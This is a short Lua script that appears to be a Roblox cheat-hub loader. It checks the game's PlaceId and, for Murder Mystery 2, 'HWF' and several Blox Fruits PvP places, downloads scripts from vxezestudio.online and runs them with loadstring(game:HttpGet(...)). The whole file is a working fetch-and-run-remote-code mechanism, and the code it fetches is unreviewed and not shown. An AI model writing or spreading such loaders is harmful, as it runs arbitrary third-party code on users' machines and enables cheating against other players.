local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local pid = game.PlaceId

if pid == 142823291 then -- MM2
    loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_r0VeAauEuUxPg/stream/init"))()

elseif pid == 98502499119821 then -- HWF
    loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_58QYU7BTt9Dg/stream/init"))()

elseif pid == 85211729168715
    or pid == 79091703265657
    or pid == 100117331123089 then -- Pvp Blox Fruits
    local ok, err = pcall(function()
        loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_Pa7uy5Z0mpKdN/stream/init"))()
    end)
else
    warn("Game not supported. PlaceId:", pid)
end
